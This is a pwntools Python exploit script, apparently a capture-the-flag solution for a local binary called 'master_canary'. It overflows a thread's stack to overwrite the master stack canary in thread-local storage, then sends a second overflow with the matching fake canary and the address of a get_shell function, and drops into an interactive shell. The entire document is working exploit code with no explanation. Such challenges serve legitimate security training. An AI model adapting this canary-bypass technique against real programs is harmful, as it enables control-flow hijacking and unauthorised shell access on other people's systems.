# Name: mc_thread.py
from pwn import *

p = process("./master_canary")
elf = ELF('./master_canary')

context.log_level = 'debug'

get_shell = elf.symbols['get_shell']

payload = b"A" * 0x948
payload += p64(0x4141414141414141)

inp_sz = len(payload)

p.sendlineafter("> ", '1')
p.sendlineafter("> ", '2')

p.sendlineafter("Size: ", str(inp_sz))
p.sendlineafter("Data: ", payload)


payload = b'A' * 48
payload += b'B' * 8
payload += p64(get_shell)

p.sendlineafter("> ", '3')
p.sendlineafter('Leave comment: ', payload)

p.interactive()

